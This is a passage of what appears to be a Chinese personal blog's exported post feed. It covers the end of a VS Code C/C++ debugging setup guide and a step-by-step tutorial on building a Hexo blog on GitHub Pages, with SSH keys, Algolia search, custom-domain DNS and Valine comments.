<span class="attr">&quot;kind&quot;</span><span class="punctuation">:</span> <span class="string">&quot;build&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;isDefault&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;detail&quot;</span><span class="punctuation">:</span> <span class="string">&quot;调试器生成的任务。&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0.0&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>如果是c++的配置，记得将tasks.json的command程序改成g++.exe，至于label和prelaunchtask这两个要是愿意也可以把gcc.exe 改成g++.exe</p></blockquote><p>使用模板之后，我们发现程序成功在cmd跑起来了</p><img src="/2022/03/23/vscode-c-c-configure/019.png" class=""><blockquote><p>因为win11特性，cmd和powershell打开都是通过windows terminal打开的，这样我感觉挺好的</p></blockquote><p>然后我们只需要注意launch配置中多了一块，那个就是我们需要用到的debug部分。如何使用如下：<br>首先创建一个断点，<img src="/2022/03/23/vscode-c-c-configure/020.png" class=""><br>就是鼠标放在语句前面出现红点，鼠标单击即可。</p><img src="/2022/03/23/vscode-c-c-configure/021.png" class=""><p>将任务调至debug</p><img src="/2022/03/23/vscode-c-c-configure/022.png" class=""><p>然后f5启动调试，我们会看到<img src="/2022/03/23/vscode-c-c-configure/023.png" class=""><br>程序停在了print函数中，右边可以看到变量i现在的值为0，cmd也没有输出，我们点击上面<img src="/2022/03/23/vscode-c-c-configure/024.png" class="">也就是单步调试，进行下一步操作的意思，我们会看到箭头跑到了for循环上，cmd也打印了一个0。</p><img src="/2022/03/23/vscode-c-c-configure/025.png" class="">在下一步可以看到i的变量变成了1<img src="/2022/03/23/vscode-c-c-configure/026.png" class=""><blockquote><p>至此，基本的程序运行和debug就解决了<br>要说vscode的缺点肯定是有的，有些很刁钻奇怪的问题他不一定会提示错误，但是就是无法运行，这点在vs 20xx系列上面就能对比出来，不过基本够用了。</p></blockquote><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>当然vscode还有一点不好，其实也是归根在微软身上，windows操作系统有个很不好的点就是系统的编码是根据地区设置来的。</p><p>那么是什么意思呢，就是简单来说，cmd的字符编码是gb2312还是啥来着，也就是在cmd中输入chcp，系统回执是936，而真正的项目开发一般都采用utf-8环境，也就是所说的65001。</p><p>所以你会发现中文，通常在cmd中都会乱码，可能网上有方法是教你文件改成ansi啊，或者gb2312的，但是这些都是治标不治本的，微软还在地区选项中有一个beta模式，可以强制系统编码为65001，但是下场很凄凉，到了别人936的环境中，你的文件所包含的中文全部是乱码的。</p><p>目前看来是没有什么办法能够根治的，因为即便你能永久修改了powershell或者cmd的字符集，但是老的windows软件可能用的还是那套字符，多少会存在差异，这也是为什么有些项目都会放在linux上开发。</p>]]></content>
      
      
      <categories>
          
          <category> software </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Blog - Theme for Hexo · Butterfly</title>
      <link href="/2022/03/20/first-blog/"/>
      <url>/2022/03/20/first-blog/</url>
      
        <content type="html"><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其实最基础的博客就跟日记一样，但是写日记这种事情基本就停留在了小学而且还得是课后作业的情况下；不过有的时候记录一些事以便日后解决也不失为一种好办法。当然好在之前也在本地用typora写过一些markdown，现在正好可以编写上传。</br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在了解了一些基础的知识后，选择用GitHub作为博客的仓库，在本地电脑上由hexo、git、node.js搭建个人博客的方案。<br/><span style="display:block; font-size:14px; text-align:right;">—— 关于文档中21年的有些本地写的md有些在csdn挪过来了</span><span style="display:block; font-size:10px; text-align:right; color:rgba(0, 0, 0, 0.1);">水文莫见怪，可看可不看</span><hr/></p><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h3 id="22-03-26-新增搜索功能"><a href="#22-03-26-新增搜索功能" class="headerlink" title="22.03.26 新增搜索功能"></a>22.03.26 新增搜索功能</h3><h3 id="22-03-26-新增域名绑定"><a href="#22-03-26-新增域名绑定" class="headerlink" title="22.03.26 新增域名绑定"></a>22.03.26 新增域名绑定</h3><h3 id="22-03-27-新增评论功能"><a href="#22-03-27-新增评论功能" class="headerlink" title="22.03.27 新增评论功能"></a>22.03.27 新增评论功能</h3><h3 id="22-03-29-修改评论系统"><a href="#22-03-29-修改评论系统" class="headerlink" title="22.03.29 修改评论系统"></a>22.03.29 修改评论系统</h3><h3 id="22-08-01-新增收藏页"><a href="#22-08-01-新增收藏页" class="headerlink" title="22.08.01 新增收藏页"></a>22.08.01 新增收藏页</h3><h3 id="22-08-09-对html的补充"><a href="#22-08-09-对html的补充" class="headerlink" title="22.08.09 对html的补充"></a>22.08.09 对html的补充</h3><h3 id="22-10-01-加密插件"><a href="#22-10-01-加密插件" class="headerlink" title="22.10.01 加密插件"></a>22.10.01 加密插件</h3><h3 id="22-10-x-抽空整理了下文章"><a href="#22-10-x-抽空整理了下文章" class="headerlink" title="22.10.x 抽空整理了下文章"></a>22.10.x 抽空整理了下文章</h3><h3 id="22-10-x-图片加水印"><a href="#22-10-x-图片加水印" class="headerlink" title="22.10.x 图片加水印"></a>22.10.x 图片加水印</h3><h3 id="22-11-x-更换主题"><a href="#22-11-x-更换主题" class="headerlink" title="22.11.x 更换主题"></a>22.11.x 更换主题</h3><p><strong>选择github更多还是因为免费，成本低。如果你自己有服务器那么可玩性更高，因为很多东西都可以部署在服务器上，像github虽然能搭建博客，但是也仅限于博客，评论系统一些东西都不够完美都是平替产品。而且加上访问速度，一篇文章的文字和资源多了，加载就要一段时间才能缓存，所以如果介意，也可以部署到gitee上稍快一点</strong></p><hr><ul><li>主题Demo：<a href="https://linhong.me/">链接</a></li><li>主题文档：<a href="https://aomori.linhong.me/v/chinese/getting-started/intro">链接</a></li></ul><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><blockquote><ul><li>GitHub账号</li><li>windows 11&#x2F;10</li><li>git          —<a href="https://git-scm.com/">https://git-scm.com/</a></li><li>node.js      —<a href="https://nodejs.org/en/download/">https://nodejs.org/en/download/</a></li></ul></blockquote><p><strong>建议先下载git工具，下载完后先注销或者重启，不然可能出现git bash无法检索到nodejs的命令。</strong><br>然后打开git bash，bash是linux终端所使用的一种，如果你对linux有一定基础相信不用多做解释，没基础也没事，基础命令都可以通过tab补齐或者copy</p><p>不放心不确定的童鞋可以在<code>git bash</code>中输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git --version</span><br><span class="line"><span class="comment">#和</span></span><br><span class="line">$ node -v</span><br></pre></td></tr></table></figure><p>正常回显版本则表示安装正确</p><p>然后安装hexo</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo -g</span><br><span class="line"><span class="comment">#也有用这种的npm install -g hexo-cli，本质都差不多</span></span><br></pre></td></tr></table></figure><p>安装完后测试:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo -v </span><br><span class="line"><span class="comment">#有正常输出且看到hexo即可</span></span><br></pre></td></tr></table></figure><hr><h1 id="Aomori"><a href="#Aomori" class="headerlink" title="Aomori"></a>Aomori</h1><h2 id="1-创建仓库"><a href="#1-创建仓库" class="headerlink" title="1.创建仓库"></a>1.创建仓库</h2><p>进入<a href="https://github.com/">github</a></p><img src="/2022/03/20/first-blog/000.png" class=""><p>创建一个新的仓库，仓库名为你的<strong>github用户名.github.io</strong></p><blockquote><p>例如用户名为test，则仓库名为test.github.io</p></blockquote><img src="/2022/03/20/first-blog/001.png" class=""><blockquote><p>此处报错是因为我已经创建过了，可以忽略</p></blockquote><p>需要注意的是：</p><blockquote><ol><li>切记是用户名而不是昵称，昵称可以随便改，用户名则是固定防止冲突的。</li><li>其次就是github访问速度正常都会比较慢，所以创建好后也别着急，可能需要等一会</li><li>最后就是因为这个仓库是以用户名为根本，所以可见每个用户只能创建一个这样的仓库</li></ol></blockquote><p>创建成功后先不用管，等会通过hexo上传仓库</p><hr><h2 id="2-配置ssh-key"><a href="#2-配置ssh-key" class="headerlink" title="2.配置ssh key"></a>2.配置ssh key</h2><p><strong>配置ssh key的目的是为了每次上传时不需要输入账号和密码</strong><br>在<code>git bash</code>中:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/.ssh</span><br></pre></td></tr></table></figure><p><strong>error:no such file or directory表示这台电脑是一次使用git</strong></p><p>输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C <span class="string">&quot;邮件地址&quot;</span></span><br></pre></td></tr></table></figure><p>连续三次回车，会在用户目录下生成一个.ssh文件夹，打开文件夹里面会有一个id_rsa.pub文件<br>看不到.ssh的童鞋可能是没有打开显示隐藏文件夹</p><img src="/2022/03/20/first-blog/003.png" class=""><p>用记事本打开id_rsa.pub文件，将其内容复制粘贴到github主页的ssh and gpg keys里</p><img src="/2022/03/20/first-blog/004.png" class=""><p>点击new ssh key，tiele随便起，内容粘贴到key里面，最后点击add ssh key</p><p>测试是否成功:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -T git@github.com <span class="comment"># 注意邮箱地址不用改</span></span><br></pre></td></tr></table></figure><p>如果提示Are you sure you want to continue connecting (yes&#x2F;no)?，输入yes，然后会看到：</p><blockquote><p>Hi 你的用户名! You’ve successfully authenticated, but GitHub does not provide shell access.<br>到这里表示ssh配置成功</p></blockquote><p>然后我们添加github用户名和注册邮箱即</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name <span class="string">&quot;username&quot;</span> <span class="comment">#你的github用户名</span></span><br><span class="line">$ git config --global user.email <span class="string">&quot;xxx@qq.com&quot;</span> <span class="comment">#填写你的github注册邮箱,qq,网易都一样</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="3-搭建博客"><a href="#3-搭建博客" class="headerlink" title="3.搭建博客"></a>3.搭建博客</h2><p>再次之前先介绍hexo基本命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;postName&quot;</span> <span class="comment">#新建文章</span></span><br><span class="line">$ hexo new page <span class="string">&quot;pageName&quot;</span> <span class="comment">#新建页面</span></span><br><span class="line">$ hexo generate <span class="comment">#生成静态页面至public目录</span></span><br><span class="line">$ hexo server <span class="comment">#开启预览访问端口（默认端口4000，&#x27;ctrl + c&#x27;关闭server）</span></span><br><span class="line">$ hexo deploy <span class="comment">#部署到GitHub</span></span><br><span class="line">$ hexo <span class="built_in">help</span>  <span class="comment"># 查看帮助</span></span><br><span class="line">$ hexo version  <span class="comment">#查看Hexo的版本</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>实际上我们常用的就几条:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean <span class="comment">#generate其实也会覆盖public文件夹，所以clean用不用都差不多</span></span><br><span class="line">$ hexo generate &gt;&gt; 缩写为 $ hexo g</span><br><span class="line">$ hexo server &gt;&gt; 缩写为 $ hexo s</span><br><span class="line">$ hexo deploy &gt;&gt; 缩写为 $ hexo d</span><br></pre></td></tr></table></figure><blockquote><p>然后选择博客放到那个文件夹，c盘d盘都可以<br>用<code>git bash</code><br>cd filename进去就行</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">pwd</span> <span class="comment">#查看当前所在目录,一般就是在c/users/xxx，直接在里面创建也行</span></span><br><span class="line">$ <span class="built_in">cd</span> /d <span class="comment">#表示切换到d盘，e盘同理</span></span><br><span class="line">$ <span class="built_in">mkdir</span> blog <span class="comment">#文件名无所谓，都行，此处以blog为例</span></span><br><span class="line">$ <span class="built_in">cd</span> blog</span><br><span class="line">$ hexo init <span class="comment">#初始化博客</span></span><br></pre></td></tr></table></figure><p>文件夹里面会出现很多内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo g <span class="comment">#生成静态文件至public文件夹</span></span><br><span class="line">$ hexo s <span class="comment">#预览博客</span></span><br></pre></td></tr></table></figure><p>浏览器url里面输入<code>localhost:4000</code>即可在浏览器中预览，如果4000端口被占用了可以尝试用其他端口</p><p>默认的主题就在&#x2F;thems 文件夹中，叫landscape，比较简单吧。</p><hr><h2 id="4-修改主题"><a href="#4-修改主题" class="headerlink" title="4.修改主题"></a>4.修改主题</h2><p><a href="https://hexo.io/themes/">https://hexo.io/themes/</a> 这是官方主题网址，总的来讲数量不多，如果修改需要一定知识储备，或者作者开源有附上教程</p><p>我这里用的主题是：<a href="https://github.com/lh1me/hexo-theme-aomori">https://github.com/lh1me/hexo-theme-aomori</a><br>预览：<a href="https://linhong.me/">https://linhong.me/</a></p><p>界面比较简洁，功能添加也比较方便</p><p>下载有两种方式</p><ol><li>就是git clone 仓库的https链接<br>git clone <a href="https://github.com/lh1me/hexo-theme-aomori.git">https://github.com/lh1me/hexo-theme-aomori.git</a> thems&#x2F;aomori</li><li>或者直接下载作者打包好的文件,作者主题网站置顶中有写</li></ol><p>二者的差别就是clone的会有.git的一些信息，具体用处不知道</p><p>下载完之后我们在blog文件夹中找到<code>_config.yml</code><br>划到最下面看到</p><blockquote><p>themes: landscape</p></blockquote><p>修改后面的内容，如果你是参照我第一种下载方式，那么因为我创建的文件夹名称为aomori，所以此处也使用aomori，如果是第二种方法下载zip压缩包解压，那么根据对应的文件夹为hexo-theme-aomori，切记不要弄错</p><p>原作者在后面标准了关掉hexo默认的highlight代码高亮，那么使用这个主题也就去关了<br>在<code>_config.yml</code>文件中找到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">highlight:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>将其修改为false</p><p>然后在<code>git bash</code>中清除静态文件夹重新生成并预览</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br><span class="line">$ hexo g</span><br><span class="line">$ hexo s</span><br></pre></td></tr></table></figure><blockquote><p>如果没有生成index.html 则可能是你删除了source文件夹中的hello-world.md文件<br>要么重新hexo init，或者直接hexo n 一个新的文件写博客，在hexo g生成，hexo s预览</p></blockquote><p>至此本地上已经没有什么问题了</p><hr><h2 id="5-上传仓库"><a href="#5-上传仓库" class="headerlink" title="5.上传仓库"></a>5.上传仓库</h2><p>还是<code>_config.yml</code>文件中，最后片段关于deploy的部分。</p><p>正确写法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repository: git@github.com:8bytes-code/8bytes-code.github.io.git</span><br><span class="line">  branch: main</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>错误写法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repository: https://github.com/8bytes-code/8bytes-code.github.io.git</span><br><span class="line">  branch: main</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>还有一点需要注意：branch，按照我的方法分支就是main，如果你的分支是master，那么branch就修改成master。</p></blockquote><p>具体如图</p><img src="/2022/03/20/first-blog/005.jpg" class=""><p>然后我们直接执行<code>hexo d</code>的时候应该是会报错的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Deployer not found: github 或者 Deployer not found: git</span><br></pre></td></tr></table></figure><p>就是少了个插件安装一下就行了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>然后我们在<code>hexo d</code>提交代码，有改动会跑一段挺长的，没改动就没啥变化，结尾就是info deploy done：git</p><p><strong>hexo d是覆盖操作，所以仓库的代码每次都会被覆盖，如果有需要自己找个地方保存一下，能力强的或许还有git clone仓库下来，然后每次提交形成分支</strong></p><hr><h2 id="6-注意的地方"><a href="#6-注意的地方" class="headerlink" title="6.注意的地方"></a>6.注意的地方</h2><h3 id="1-hexo-n-一个文件的时候"><a href="#1-hexo-n-一个文件的时候" class="headerlink" title="1.hexo n 一个文件的时候"></a>1.hexo n 一个文件的时候</h3><p>其中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">---</span><br><span class="line">title: name <span class="comment">#文章显示的名称</span></span><br><span class="line"><span class="built_in">date</span>:       <span class="comment">#默认根据创建的时候生成，一般不做修改</span></span><br><span class="line">tags:       <span class="comment">#文章标签，如果所用主题有文章分类功能，可以为其添加</span></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">下面才是写正文的地方</span><br><span class="line"></span><br><span class="line">如果需要设置文章不显示全部内容，使用 &lt;!--more--&gt;的时候注意上下都空两行，否则可能不起效果，具体原因未知，有的时候好像不会被占用，好像会和上下文字所使用的标题什么的有影响保险起见多空几行的了</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-图片的设置"><a href="#2-图片的设置" class="headerlink" title="2.图片的设置"></a>2.图片的设置</h3><img src="/2022/03/20/first-blog/005.png" class=""><p>在首页中文章所示图片是根据作者文档中描述的属性</p><img src="/2022/03/20/first-blog/006.png" class=""><blockquote><p>即添加在.md文件的头部— xxxx —之中<br>至于路径设置我是在source文件夹下新建了一个images文件夹，然后设置</p></blockquote><img src="/2022/03/20/first-blog/007.png" class=""><p>至于文章中的图片，以后如果文章写的多了，图片都在一个文件夹不利于管理，而且命名也麻烦<br>于是参考官方文档<a href="https://hexo.io/zh-cn/docs/asset-folders">https://hexo.io/zh-cn/docs/asset-folders</a></p><img src="/2022/03/20/first-blog/008.png" class=""><p>修改<code>_config.yml</code>的post_asset_folder属性之后，hexo n 一个新的文件都会附带一个一样名称的文件夹，我们把那篇文章需要用到的图片放到文件夹里即可，引用方法也如标红所示:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%asset_img filename.jpg/png  %&#125;</span><br></pre></td></tr></table></figure><p>当然markdown的原生引用图片方法也没问题，但是图片存放路径都是建议放在<code>source</code>目录下<br>使用的时候也是通过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![描述](./source/)建议还是相对路径</span><br></pre></td></tr></table></figure><blockquote><p>后面的描述可有可无</p></blockquote><p>最后就是作者写的教程：<a href="https://aomori.linhong.me/v/chinese/getting-started/intro">https://aomori.linhong.me/v/chinese/getting-started/intro</a><br>自己在慢慢做调整吧，开源是美德，但没有义务一直帮你，大家慢慢凭借文档修改吧。</p><blockquote><p>遇到bug可以上github提交issues。</p></blockquote><h3 id="3-README-md"><a href="#3-README-md" class="headerlink" title="3.README.md"></a>3.README.md</h3><p>默认情况下，hexo会把source里面的所有.md类型文件都转换成.html类型，所以导致仓库的README.md文件显得很蛋疼，解决方法在<code>_config.yml</code>下找到并修改即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skip_render: README.md</span><br></pre></td></tr></table></figure><p>还有就是，关于为什么README.md下图片不能显示的问题，估计看了下，存储资源的地址是在<code>raw.githubusercontent.com</code>下，而这个域名恰好有个问题就是dns污染，导致资源不一定会被正确访问，即使你通过修改本机hosts文件去指定，但是访问速度还是太慢了，所以办法就是要么视而不见，要么上科学道具去访问就能看到了。</p><hr><h2 id="7-新增搜索功能"><a href="#7-新增搜索功能" class="headerlink" title="7.新增搜索功能"></a>7.新增搜索功能</h2><img src="/2022/03/20/first-blog/009.png" class=""><p>如文档所示，先访问<a href="https://www.algolia.com/">Algolia</a>, 创建账号或者使用github登录</p><img src="/2022/03/20/first-blog/018.png" class=""><blockquote><p>这里弄得太快忘了，如果你的index没有，那么就new一个，名字后面会用到</p></blockquote><p>然后点击settings,点击api keys,new一个 api key，indices选之前新建的index名字，acl权限就按照我这个几个先给了</p><img src="/2022/03/20/first-blog/017.png" class=""><p>你还需要在<code>git bash</code>安装这个拓展</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install --save hexo-algolia</span><br></pre></td></tr></table></figure><p>并且在全局配置文件<code>_config.yml</code>下填入配置，这些都是在api keys的your api keys里面套</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">algolia:</span><br><span class="line">  applicationID: <span class="string">&#x27;applicationID&#x27;</span></span><br><span class="line">  apiKey: <span class="string">&#x27;apiKey&#x27;</span></span><br><span class="line">  indexName: <span class="string">&#x27;...&#x27;</span></span><br></pre></td></tr></table></figure><p>然后在<code>git bash</code>下输入命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">export</span> HEXO_ALGOLIA_INDEXING_KEY=</span><br><span class="line"><span class="comment">#这个key就是刚才创建的api的key，默认的就一个搜索功能在使用hexo algolia是会报下面的错</span></span><br><span class="line"><span class="comment">#ERROR [hexo-algolia] Not enough rights to update an object near line:1 column:785</span></span><br><span class="line">$ hexo clean</span><br><span class="line">$ hexo algolia</span><br></pre></td></tr></table></figure><p>成功会返回<img src="/2022/03/20/first-blog/019.png" class=""></p><p>最后在站点启用搜索功能</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aomori_search_algolia: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><strong>注意：以后发布文章都需要运行hexo algolia，否则新文章没有创建记录，无法被检索</strong></p><blockquote><p>ERROR [hexo-algolia] Please set an HEXO_ALGOLIA_INDEXING_KEY environment variable to enable content indexing.<br>ERROR &gt;&gt; Read <a href="https://npmjs.com/hexo-algolia#api-key">https://npmjs.com/hexo-algolia#api-key</a> for more informations.<br>后续如果使用hexo algolia报此错误，那么请重新输入上面export HEXO_ALGOLIA_INDEXING_KEY，具体原因出在哪不知道，好像隔段时间就没记忆了，所以建议你将自建权限的key以注释的方法存在_config.yml下，以方便后期重新更新使用。</p></blockquote><p><strong>注意</strong></p><p>如果搜索跳转时网址显示<code>http://example.com</code>开头，在algolia记录里可以看到：<img src="/2022/03/20/first-blog/023.png" class=""><br>那么请注意你的<code>_config.yml</code>配置中找到<img src="/2022/03/20/first-blog/024.png" class=""><br>将url修改为你github page的地址，或者你购买了域名就改成域名，上述注释是清楚描述了这个问题。<br>修改完之后在<code>git bash</code>执行hexo algolia重新生成即可。</p><hr><h2 id="8-新增域名绑定"><a href="#8-新增域名绑定" class="headerlink" title="8.新增域名绑定"></a>8.新增域名绑定</h2><p><strong>不是打广告</strong>，阿里云和腾讯云都行，万网好像是被阿里收购了，所以都差不多，目前购买域名需要实名认证，不要打马虎眼。</p><p>此处以阿里云举例：<a href="https://wanwang.aliyun.com/domain?spm=5176.21213303.J_6704733920.9.300953c9w7wqdp&scm=20140722.S_product@@%E4%BA%91%E4%BA%A7%E5%93%81@@999997._.ID_product@@%E4%BA%91%E4%BA%A7%E5%93%81@@999997-RL_%E5%9F%9F%E5%90%8D-LOC_main-OR_ser-V_2-P0_1">戳此处</a></p><img src="/2022/03/20/first-blog/010.png" class=""><p>首先搜索你需要的域名，此处以hhh为例，点击查询可以看到</p><img src="/2022/03/20/first-blog/011.png" class=""><p>大概是简短或者商用价值比较高的域名价格都比较贵，其次按照域名的等级<br>买家可以买一年也可以一次性买十年，这个都随便，至于检索速度还是要看各搜索引擎了。我买的是.top的</p><p>买完之后去工作台，找到域名服务，管理你的域名;<strong>刚买完需要审核1-2日，但是实际上还是比较快的用不了几分钟</strong></p><img src="/2022/03/20/first-blog/012.png" class=""><p>你进去的页面可能是在审核中，但是没关系，我们点击后面的解析，他会跳转到一个页面</p><img src="/2022/03/20/first-blog/013.png" class=""><p>在此处我们需要添加两条记录，这个其实相当于dns的解析，如果学过一点的会知道，dns有正向和逆向的，说白了就是从域名翻译成服务器ip地址，从服务器ip地址翻译成域名这两条记录</p><blockquote><p>此处需要注意ip地址可能要添加两条记录，一条ipv4和一条ipv6</p></blockquote><p>如何查看IP地址，win+r 输入cmd 回车，当然<strong>ping 你用户名.github.io</strong>是最简单的，但是现在可能返回的都是ipv6了<br>或者直接github看文档吧<a href="https://docs.github.com/cn/pages/configuring-a-custom-domain-for-your-github-pages-site/managing-a-custom-domain-for-your-github-pages-site#configuring-an-apex-domain">戳此处</a></p><p><del>划到第五步，此处我不确定提示的ip是每个人都相同还是不相同就先打码了</del><br><del>虽然感觉应该是一样的，毕竟github总不能你建一个仓库他单独给你一个ip地址，ipv4早用光了</del></p><img src="/2022/03/20/first-blog/014.png" class=""><blockquote><p>按照第五步显示的两块ip，各取相同一行的一条记录，添加到域名解析里面的记录值</p></blockquote><img src="/2022/03/20/first-blog/015.png" class=""><blockquote><p>a对应ipv4，aaaa对应ipv6。且这两条主机记录为@。地址再次强调就是第五步显示的<br>用户名.github.io 那条的主机类型为www，记录类型为CNAME。</p></blockquote><p>然后进入你github博客仓库，找到设置，找到pages，将域名填入custom domain之中，看他是否打勾</p><img src="/2022/03/20/first-blog/016.png" class=""><p>此处他还会花一点时间安装tsl证书还是啥，估摸着应该是和ssl证书差不多的东西吧，因为https是在http基础上增加了ssl证书获得一个加密性。等待一段时间即可，至于下面的强制https，开不开都行，https自然是会安全一点的。</p><p>然后在博客文件夹目录下的<code>source</code>下，新建一个CNAME的文件，记住没有拓展名，打开后输入你买的域名，不需要加https，就单纯的域名.com啥的</p><p>完成后，在浏览器url中输入你的域名，即可跳转到个人博客！</p><blockquote><p>然后就是印证猜想了，通过百度了几个人用github搭建的博客绑定域名过程中我看到他们ping的结果都是跟文档里的那几个一样的。<br>所以我们在url里面输入ping测试返回的ip地址是不会跳转到我们的博客的，但是用户名.github.io会跳转。至于为什么还要增加我就不清楚了，本文重在使用。</p></blockquote><hr><h2 id="9-新增评论功能"><a href="#9-新增评论功能" class="headerlink" title="9.新增评论功能"></a>9.新增评论功能</h2><p>看了下作者主题用的是remark42，那么也就去摸索一下remark42，但是看了下好像需要后端服务器或者通过docker跑，这倒是感觉不太适合我这种单纯建在github的用户，或者是我哪里看漏了。<br>gitalk和giscus好像都是基于github的issue开发的，好处就是直接调用仓库的评论，缺点是开<br>项目不确定什么时候就倒台了或者出现大范围更新，导入导出都不方便。<br>围观了几圈之后，就选了作者支持的<code>Valine</code>,使用方法也有<a href="https://valine.js.org/">官方文档</a><br>好处是什么呢，就是我们无需在网页中增加js代码，只需要在<code>_config.yml</code>中增加：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aomori_valine:</span><br><span class="line">  enable: true</span><br><span class="line">  appId: &#x27;&#x27;</span><br><span class="line">  appKey: &#x27;&#x27;</span><br></pre></td></tr></table></figure><img src="/2022/03/20/first-blog/020.png" class=""><p>根据提示我们先去注册一个<code>LeanCloud</code>国际版,<a href="https://console.leancloud.app/">戳此处</a></p><blockquote><p>需要实名认证，短信验证，邮箱验证</p></blockquote><p>进入之后我们创建一个应用，名称和描述随便。选择开发版就行了。<img src="/2022/03/20/first-blog/021.png" class=""><br>找到我们的appid和appkey，将其复制到我们刚才在<code>_config.yml</code>中的那两行即可。<img src="/2022/03/20/first-blog/022.png" 